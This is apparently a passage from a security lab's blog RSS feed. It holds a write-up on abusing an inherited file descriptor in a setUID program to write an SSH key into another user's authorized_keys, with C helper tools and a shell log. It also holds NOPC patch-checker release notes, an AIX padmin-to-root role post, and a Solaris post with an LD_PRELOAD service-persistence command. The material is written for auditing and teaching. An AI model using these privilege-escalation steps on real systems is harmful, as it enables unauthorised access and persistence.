+<p>We also don&#8217;t control the permissions the file gets created with. (Feel free to try the above on authorized_keys2 after running &#8220;umask 0&#8243; to check).</p>
+<h3>Step 2: Running code in child process</h3>
+<p>It&#8217;s pretty easy to run code because of the nature of the program. Again, this was harder in the nebula challenge. We can see the file handle we want listed in /proc/self/fd. It&#8217;s file descriptor 3:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak bash
+subshell...
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
+lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
+</pre>
+<p>So we can just &#8220;echo key &gt; /proc/self/fd/3&#8243;? Not really. That&#8217;s just a symlink. A symlink to a file that doesn&#8217;t exist to be precise. And it&#8217;s pointing to a location that we&#8217;d don&#8217;t have privileges to create. Let&#8217;s confirm that:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
+bash: /home/tom/.ssh/authorized_keys: Permission denied
+bob@challenge:~$ echo &gt; /tmp/tmpfile
+bash: /tmp/tmpfile: Permission denied
+bob@challenge:~$ echo &gt; /proc/self/fd/3
+bash: /proc/self/fd/3: Permission denied
+</pre>
+<p>We need to write to file descriptor 3&#8230; So is there are version of cat that works with file descriptors? Not that I know of. Let&#8217;s write some small utilities that will help us get to grips with accessing inherited file handles. We&#8217;ll write 3 tools:</p>
+<ul>
+<li>read &#8211; that uses the read function to read a set number of bytes from a particular file descriptor</li>
+<li>write &#8211; that writes a string of our choosing to a particular file descriptor</li>
+<li>lseek &#8211; that lets us position our read/write</li>
+</ul>
+<p>Here&#8217;s the source and compilation of the (very crude) demo tools:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ cat read.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ char buf[1024];
+ memset(buf, 0, 1024);
+ int r = read(atoi(argv[1]), buf, 10);
+ printf(&quot;Read %d bytes\n&quot;, r);
+ write(1, buf, 10);
+}
+
+bob@challenge:~$ gcc -o read read.c
+bob@challenge:~$ cat write.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;writing %s to fd %s\n&quot;, argv[2], argv[1]);
+ write(atoi(argv[1]), argv[2], strlen(argv[2]));
+}
+bob@challenge:~$ gcc -o write write.c
+bob@challenge:~$ cat lseek.c
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;seek to position %s on fd %s\n&quot;, argv[2], argv[1]);
+ lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
+}
+
+bob@challenge:~$ gcc -o lseek lseek.c
+</pre>
+<p>Let&#8217;s see the tools in action. First we try to read, then write to file descriptor 3, but the read always returns 0 bytes:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./read 3
+Read 0 bytes
+bob@challenge:~$ ./write 3 hello
+writing hello to fd 3
+bob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>The reason is that we need to seek to a location in the file that isn&#8217;t the end of the file. Let&#8217;s seek to position 0, the beginning of the file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./read 3
+Read 10 bytes
+pointless bob@challenge:~$ ./read 3
+Read 10 bytes
+data
+hellobob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>Much better.</p>
+<p>Finally we need exploit the program above. We have two choices:</p>
+<ul>
+<li>Run a shell as before, then use our new tool to write the key to authorized_keys; or</li>
+<li>Make a new tool using the functions shown above to write to authorized_keys.</li>
+</ul>
+<p>Let&#8217;s do the former. The latter is an exercise for the reader. Note that we need to seek to position 0 before we write our data. It&#8217;s important to overwrite the &#8220;pointless&#8221; message already there as that corrupts the authorized_keys file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in bobkey.
+Your public key has been saved in bobkey.pub.
+bob@challenge:~$ cat bobkey.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
+bob@challenge:~$ ls -l bobkey.pub
+-rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
+ writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
+</pre>
+<h3>Step 3: Logging in via SSH</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh -i bobkey tom@localhost
+$ id
+uid=1002(tom) gid=1002(tom) groups=1002(tom)
+</pre>
+<p>We&#8217;re done. We exploited the leaked file descriptor to write data of our choosing to tom&#8217;s authorized_keys file. We used a slightly unrealistic symlink attack along the way, but that doesn&#8217;t invalidate our discussion of how to use and abuse leaked file descriptors.</p>
+<h2>Conclusion</h2>
+<p>Hacker challenges are fun. Even when you accidentally find a much harder solution and waste 10 times longer than necessary.</p>
+<p>Writing secure setUID programs can be difficult. Particularly if you spawn child processes; particularly if you use open() in directories writable by other users. fs.protected_symlinks provides some mitigation for directories with the sticky bit set.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>NOPC version 0.4.7 released</title>
+		<link>https://labs.portcullis.co.uk/blog/nopc-version-0-4-7-released/</link>
+		<comments>https://labs.portcullis.co.uk/blog/nopc-version-0-4-7-released/#comments</comments>
+		<pubDate>Wed, 28 Oct 2015 14:14:21 +0000</pubDate>
+		<dc:creator><![CDATA[BLH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5355</guid>
+		<description><![CDATA[<p>NOPC, the Nessus-based offline patch checker for Linux distributions and UNIX-based systems has had some changes made and been made available in our tools section. This article discusses the new features in detail and provides some working examples. Updated features and bug fixes Improvements to the interactive mode (e.g. asking for what format for results [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/nopc-version-0-4-7-released/">NOPC version 0.4.7 released</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>NOPC, the Nessus-based offline patch checker for Linux distributions and UNIX-based systems has had some changes made and been made available in our <a title="tools" href="https://labs.portcullis.co.uk/tools/">tools</a> section. This article discusses the new features in detail and provides some working examples.<span id="more-5355"></span></p>
+<h2>Updated features and bug fixes</h2>
+<ul>
+<li>Improvements to the interactive mode (e.g. asking for what format for results to be displayed)</li>
+<li>Hidden systems/distributions now displayed and re-ordered (see Usage)</li>
+<li>Script consolidated back to one file</li>
+<li>Testing script with shellcheck</li>
+<li>Default location set for nasl and plugin directory</li>
+</ul>
+<h2>Usage</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ nopc.sh -?
+/opt/bin/nopc.sh [Options]
+Version: nopc.sh  0.4.7d
+OPTIONS:
+  -?: This usage page
+  -d: Location of Nessus Plugins directory
+  -n: Location of nasl program directory
+  -s: System Type (with optional arguments)
+  -l: Output Type
+  -v: Version of NOPC
+
+Where system type is one of:
+ 1 - AIX
+ 2 - HP-UX
+ 3 - MacOS X *
+ 4 - Solaris (!11) *
+ 5 - Debian
+ 6 - FreeBSD
+ 7 - Gentoo
+ 8 - Mandrake
+ 9 - Redhat
+ 10 - Redhat (Centos)
+ 11 - Redhat (Fedora)
+ 12 - Slackware
+ 13 - SuSE *
+ 14 - Ubuntu
+ 15 - Cisco IOS/ASA *
+
+ * EXPERIMENTAL!!
+
+Where output type is one of:
+ 0 - Displays Outdated Packages only
+ 1 - Displays NASL name and Outdated Packages
+ 2 - CSV output of CVE, KB and description (comma)
+ 3 - CSV output of CVE, CVSSv2, Severity, KB, Description (comma)
+ 4 - CSV output of CVE, KB and description (tab)
+ 5 - CSV output of CVE, CVSSv2, Severity, KB, Description (tab)
+
+** Entering no parameters will run this in wizard mode walking you through the data collection for your desired system
+</pre>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/nopc-version-0-4-7-released/">NOPC version 0.4.7 released</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/nopc-version-0-4-7-released/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>padmin to root: Roles on AIX</title>
+		<link>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/#comments</comments>
+		<pubDate>Fri, 02 Oct 2015 14:47:26 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[AIX]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5255</guid>
+		<description><![CDATA[<p>Following a recent post from a consultant at IBM discussing how how privileged access should be performed on VIOS, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love root. For those of you that are new, welcome aboard. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Following a recent post from a consultant at IBM discussing how <a title="how privileged access should be performed on VIOS" href="https://www.ibm.com/developerworks/community/blogs/AIXDownUnder/entry/VIOS_switching_between_padmin_and_root1?lang=en">how privileged access should be performed on VIOS</a>, I figured it was time to share some of our research in this arena. Those of you that are regular readers will know that I love <a title="root" href="/tag/root/">root</a>. For those of you that are new, welcome aboard.<span id="more-5255"></span></p>
+<p>Let&#8217;s start by defining what VIOS is. VIOS is a subsystem that runs on a logical partition (LPAR) which manages shared hardware such as disks and network adaptors and allows other LPARs to access them. VIOS is managed via a special padmin account which gives access to a restricted shell from where the hardware can be managed. In practice, however it&#8217;s just another AIX LPAR and as the blog post from IBM notes, setup_oem_env can be used to move from the padmin user to the root user.</p>
+<p>Firstly, note that setup_oem_env is not setUID. So how does it work? Examining the padmin user we see that it has a single role (PAdmin):</p>
+<p>The membership of a role is determined by /etc/security/user but we can examine a specific use using the rolelist command like so:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rolelist -u padmin
+PAdmin
+</pre>
+<p>You can also find your current active role using the -e flag to rolelist. Moving on, what does the PAdmin role mean?</p>
+<p>Roles are defined in /etc/security/role but as with role membership, we can also use shell commands to enumerate them. For example, the following shows what authorisations the PAdmin role has:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ lsrole PAdmin
+PAdmin
+authorizations=vios.device,vios.fs,vios.install,vios.lvm,vios.network,vios.security,vios.system,vios.oemsetupenv,vios.system.cluster,aix.system.config.artex
+rolelist= groups=staff visibility=1 screens=* dfltmsg= msgcat= auth_mode=INVOKER
+id=23
+</pre>
+<p>In the context of getting root, vios.oemsetupenv is the charm. This and other AIX authorisations are defined in /etc/security/privcmds. It is possible to specify what commands the possessor of the vios.oemsetupenv authorisation can run (and indeed the privileges with which those commands will ultimately be executed).</p>
+<p>You see, AIX like Solaris, is gradually getting rid of the concept that uid=0 is god. IBM haven&#8217;t taken this as far as Oracle yet but there&#8217;s nothing to stop a dedicated administrator from leveraging this functionality. So, if you&#8217;re auditing an AIX box, I would very much recommend checking what roles users have (via /etc/security/user) to ensure that no appropriate roles have been assigned.</p>
+<p>PS I&#8217;ve never seen this used in practice (outside of VIOS), but I&#8217;m sure there will be a first time.<br />
+PPS rolelist -p will tell you what roles a given process has.<br />
+PPPS esaadmin has the SysConfig role but it&#8217;s not normally an active account.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/">padmin to root: Roles on AIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/padmin-to-root-roles-on-aix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>NOPC version 0.4.5 released</title>
+		<link>https://labs.portcullis.co.uk/blog/nopc-version-0-4-5-released/</link>
+		<comments>https://labs.portcullis.co.uk/blog/nopc-version-0-4-5-released/#comments</comments>
+		<pubDate>Fri, 12 Jun 2015 08:38:39 +0000</pubDate>
+		<dc:creator><![CDATA[BLH]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3683</guid>
+		<description><![CDATA[<p>NOPC, the Nessus-based offline UNIX patch checker has had some changes made and been made available in our tools section. This article discusses the new features in detail and provides some working examples. Introduction There have been some updates to the NOPC tool. The latest version is now 0.4.5. Updated features and bug fixes Added Output [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/nopc-version-0-4-5-released/">NOPC version 0.4.5 released</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>NOPC, the Nessus-based offline UNIX patch checker has had some changes made and been made available in our <a title="tools" href="https://labs.portcullis.co.uk/tools/">tools</a> section. This article discusses the new features in detail and provides some working examples.<span id="more-3683"></span></p>
+<h2>Introduction</h2>
+<p>There have been some updates to the <a title="NOPC tool" href="https://labs.portcullis.co.uk/tools/nopc/">NOPC tool</a>. The latest version is now 0.4.5.</p>
+<h2>Updated features and bug fixes</h2>
+<ul>
+<li>Added Output CSV Format to display information of affected CVEs and CVSS scores</li>
+<li>Fixed bug in Ubuntu, Redhat and others where &#8220;host/cpu&#8221; type (value of either: x86_64, i686) is required</li>
+<li>Fixed OSX mktemp problem by forcing temp storage in /tmp/kb.xxxx directory</li>
+<li>Fixed bug in HP-UX section where &#8220;/Host/HP-UX/hardware&#8221; is required</li>
+</ul>
+<h2>Usage</h2>
+<p>The following are optional parameters:</p>
+<ul>
+<li>-d &#8216;nessus plugin dir&#8217;</li>
+<li>-l &#8216;output type&#8217;</li>
+<li>-n &#8216;location of nasl command&#8217;</li>
+<li>-s &#8216;system type&#8217;</li>
+</ul>
+<p>The -d option is not required as the default settings is the location for a standard nessus installation (/opt/nessus/lib/nessus/plugins/).</p>
+<p>The -l option decides how the output is displayed (see below for support output types). The -n option is not required if you include the nasl command in your path (e.g. export PATH=$PATH:/opt/nessus/bin/). The -s option selects which operating system that will analysed (discussed later).</p>
+<h2>Output types</h2>
+<p>Basically, there are raw and CSV output types. There are different output variations available particularly for CSV as follows:<br />
+* -l &#8217;0&#8242; = Displays outdated package information only. This is the Installed and Fixed version for each outdated package<br />
+* -l &#8217;1&#8242; = Displays NASL name and outdated packages<br />
+* -l &#8217;2&#8242; = Displays CVEs for each affected package in (CSV comma separated format)<br />
+* -l &#8217;3&#8242; = Displays CVEs and CVSSv2 score for each affected package (CSV comma separated format)<br />
+* -l &#8217;4&#8242; = Displays CVE for each affected package (tab separated format)<br />
+* -l &#8217;5&#8242; = Displays CVE and CVSSv2 score for each affected package (tab separated format)</p>
+<h2>Interactive mode</h2>
+<p>If nopc.sh is launched with no -s option, it will go to interactive mode.</p>
+<h3>Example</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ nopc.sh -l 3
+[+] What type of system have you got the patch output for?
+ 1 - Redhat
+ 2 - OSX
+ 3 - Debian
+ 4 - Ubuntu
+ 5 - Slackware *
+ 6 - Solaris (Maybe !11) *
+ 7 - AIX
+ 8 - HP-UX *
+ 9 - FreeBSD *
+ 10 - Cisco ASA/IOS
+
+ * UNTESTED!!
+
+Enter 1-10? 4
+[+] Ubuntu Selected
+[+] Run 'dpkg -l|cat &gt; patchlist.txt'
+[+] Enter Location of file: patch-ubuntu-krb5-2.txt
+[+] Enter the Value of DISTRIB_RELEASE=() from /etc/lsb-release e.g. 11.10
+[+] Enter Text Requested: 10.04
+[+] Enter value of 'uname -m' e.g. x86_64, i686
+[+] Enter Text Requested: i586
+[+] To run this in a script the command would be:
+
+/opt/bin/nopc.sh -l '3' -s '4' 'patch-ubuntu-krb5-2.txt' '10.04' 'i586'
+
+[+] Locating Nasls
+[+] Checking for 2314 Missing Patches
+NOPC, Ubuntu
+Plugin ID, CVE, CVSSv2, Severity, KB, Title
+61379, &quot;CVE-2012-1012, CVE-2012-1013, CVE-2012-1014, CVE-2012-1015&quot;, 9.3, High, &quot;USN-1520-1&quot;, &quot;Ubuntu 10.04 LTS / 11.04 / 11.10 / 12.04 LTS : krb5 vulnerabilities (USN-1520-1)&quot;
+51116, &quot;CVE-2010-1323, CVE-2010-1324, CVE-2010-4020, CVE-2010-4021&quot;, 4.3, Medium, &quot;USN-1030-1&quot;, &quot;Ubuntu 6.06 LTS / 8.04 LTS / 9.10 / 10.04 LTS / 10.10 : krb5 vulnerabilities (USN-1030-1)&quot;
+52682, &quot;CVE-2011-0284&quot;, 7.6, High, &quot;USN-1088-1&quot;, &quot;Ubuntu 9.10 / 10.04 LTS / 10.10 : krb5 vulnerability (USN-1088-1)&quot;
+55074, &quot;CVE-2011-0285&quot;, 10, High, &quot;USN-1116-1&quot;, &quot;Ubuntu 9.10 / 10.04 LTS / 10.10 : krb5 vulnerability (USN-1116-1)&quot;
+51985, &quot;CVE-2010-4022, CVE-2011-0281, CVE-2011-0282&quot;, 5, Medium, &quot;USN-1062-1&quot;, &quot;Ubuntu 8.04 LTS / 9.10 / 10.04 LTS / 10.10 : krb5 vulnerabilities (USN-1062-1)&quot;
+49772, &quot;CVE-2010-1322&quot;, 6.5, Medium, &quot;USN-999-1&quot;, &quot;Ubuntu 10.04 LTS / 10.10 : krb5 vulnerability (USN-999-1)&quot;
+</pre>
+<h2>Command line</h2>
+<p>You will notice that the interactive version displays corresponding command-line syntax you could have used. In the example above the following non-interactive invocation could have been used:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+/opt/bin/nopc.sh -l '3' -s '4' 'patch-ubuntu-krb5-2.txt' '10.04' 'i586'
+</pre>
+<p>Other interesting variations include for Mac OSX, the location of files for Nessus is may not be same Linux (e.g. /library/Nessus) and hence you will need to add -d and -n options to run as follows:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ nopc.sh -d &quot;/Library/Nessus/run/lib/nessus/plugins/&quot; -n &quot;/Library/Nessus/run/bin/nasl&quot; -l '3' -s '4' 'patch-ubuntu-10.04.txt' '10.04' 'i586'
+</pre>
+<p>You can also use specific plugins, which what I did in testing nopc.sh out. For example, copy a number of nasls into a directory myplugins and then:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ nopc.sh -d &quot;myplugins/&quot; -l '3' -s '4' 'patch-ubuntu-10.04.txt' '10.04' 'i586'
+</pre>
+<h2>Hidden options</h2>
+<p>You will see that there are 10 options in the interactive mode.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+ 1 - Redhat
+ 2 - OSX
+ 3 - Debian
+ 4 - Ubuntu
+ 5 - Slackware *
+ 6 - Solaris (Maybe !11) *
+ 7 - AIX
+ 8 - HP-UX *
+ 9 - FreeBSD *
+ 10 - Cisco ASA/IOS
+</pre>
+<p>However a few more are added in this release:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+ 11. SuSE
+ 12. CentOS
+ 13. Fedora
+ 14. Gentoo
+ 15. Mandrake
+</pre>
+<h3>Example</h3>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ nopc.sh -s 11
+ [+] SuSE Selected
+ [+] Run '/bin/rpm -qa --qf '%{NAME}-%{VERSION}-%{RELEASE}|%{EPOCH}\n' &gt; patchlist.txt'
+ [+] Enter Location of file: patch-suse10-multi1.txt
+ [+] Run 'cat /etc/SuSE-release &gt; release.txt
+ [+] Enter Location of file: release-suse-10.txt
+ [+] Enter value of 'uname -m' e.g. x86_64, i686
+ [+] Enter Text Requested: i686
+ [+] To run this in a script the command would be:
+
+/opt/bin/nopc.sh -s '11' 'patch-suse10-multi1.txt' 'release-suse-10.txt' 'i686'
+
+[+] SuSE Selected
+ [+] Locating Nasls
+ [+] Checking for 4905 Missing Patches
+ /opt/nessus/lib/nessus/plugins/suse_SA_2007_004.nasl: Success
+ /opt/nessus/lib/nessus/plugins/suse_SA_2007_025.nasl: Success
+ /opt/nessus/lib/nessus/plugins/suse_SA_2007_038.nasl: Success
+</pre>
+<p>Note for these distributions, some simple tests were performed to ensure it is working (as they are not as commonly seen OS).</p>
+<p>The next version of NOPC will update the interactive screen and also include an option to which output type format to use.</p>
+<h2>Summary</h2>
+<p>This article presents the improvements and fixes to NOPC for the version 0.4.5 release. We have gone through examples and how to use it.</p>
+<p>If you find any bugs with this version, please let us know, particularly if you know you are reviewing a vulnerable system and NOPC generates no output or errors.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/nopc-version-0-4-5-released/">NOPC version 0.4.5 released</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/nopc-version-0-4-5-released/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>uid=0 is deprecated: A trick unix-privesc-check doesn&#8217;t yet know</title>
+		<link>https://labs.portcullis.co.uk/blog/uid0-is-deprecated-a-trick-unix-privesc-check-doesnt-yet-know/</link>
+		<comments>https://labs.portcullis.co.uk/blog/uid0-is-deprecated-a-trick-unix-privesc-check-doesnt-yet-know/#comments</comments>
+		<pubDate>Tue, 05 May 2015 13:23:35 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[Solaris]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5100</guid>
+		<description><![CDATA[<p>Just like Linux, the modern Solaris install doesn&#8217;t simply rely on UID/GID to determine privilege. Instead there are roles and profiles to contend with. The following is a loose explanation of how they work: User = user + group + user_attr + /etc/security/auth_attr + /etc/security/auth_attr.d/* user = Raw privileges (PRIV_DEFAULT + !PRIV_LIMIT) user_attr = List [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/uid0-is-deprecated-a-trick-unix-privesc-check-doesnt-yet-know/">uid=0 is deprecated: A trick unix-privesc-check doesn&#8217;t yet know</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Just like Linux, the modern Solaris install doesn&#8217;t simply rely on UID/GID to determine privilege. Instead there are roles and profiles to contend with. The following is a loose explanation of how they work:<span id="more-5100"></span></p>
+<ol>
+<li>User = user + group + user_attr + /etc/security/auth_attr + /etc/security/auth_attr.d/*</li>
+<li>
+<ol>
+<li>user = Raw privileges (PRIV_DEFAULT + !PRIV_LIMIT)</li>
+<li>user_attr = List of profiles (/etc/security/prof_attr + /etc/security/prof_attr.d/*)</li>
+<ol>
+<li>prof_attr = List of authorisations (/etc/security/auth_attr + /etc/security/auth_attr.d)</li>
+</ol>
+</ol>
+</li>
+</ol>
+<p>Additionally, /etc/security/exec_attr specifies what privs a particular command will execute under a given profile.</p>
+<p>The first user added will get root by virtue of this scheme. Having said that, for Solaris 11, Oracle pretty much canned this and moved to sudo instead. It&#8217;s still there though, if you look.</p>
+<p>So today, we were looking at a Solaris 11 box which was mostly being managed via sudo. I say mostly because we found this (isolated) gem in user_attr:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+bob::::profiles=Service Management,Service Operator
+</pre>
+<p>It&#8217;s likely not a backdoor but it is rather odd given the beautiful /etc/sudoers.d hirearchy that also existed on the same system. This authorised them to use the solaris.smf.manage and solaris.smf.modify privileges.</p>
+<p>This could be bad. To quote the <a title="man page" href="http://docs.oracle.com/cd/E23824_01/html/821-1474/smf-security-5.html">man page</a>, users authorised with the solaris.smf.modify privilege are:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+Authorized to add, delete, or modify services, service instances, or their properties, and to read protected property values.
+</pre>
+<p>whilst solaris.smf.manage is:</p>
+<pre class="brush: plain; gutter: false; title: ; notranslate">
+The service management profile is the minimum required to use the pkg(1) command to add or remove software packages that contain an inventory of services in its service manifest.
+</pre>
+<p>So is it exploitable? Well, it turns out that users with those particular authorised privileges can run the following:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@localhost:~ $ svccfg -s &lt;service&gt; setenv -m start LD_PRELOAD /tmp/libdoor.so; svcadm refresh &lt;service&gt;; svcadm restart &lt;service&gt;
+</pre>
+<p>This, when executed, will cause the named service to have a new environment variable defined (LD_PRELOAD) which points at our malicious code (/tmp/libdoor.so) which will be loaded by the service when it is restarted. As a result, our malicious code will be run as the same user as the victim user, giving us persistent privileged access to the victim machine.</p>
+<p>Without these privileges, the same command will result in an error:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@localhost:~ $ svccfg -s &lt;service&gt; setenv -m start LD_PRELOAD /tmp/libdoor.so; svcadm refresh &lt;service&gt;; svcadm restart &lt;service&gt;
+svccfg: Permission denied.
+</pre>
+<p>Bottom line, if you compromise a modern Solaris box, try running auths (and roles) to check what privileges may have been left behind, it may be more than you think.</p>
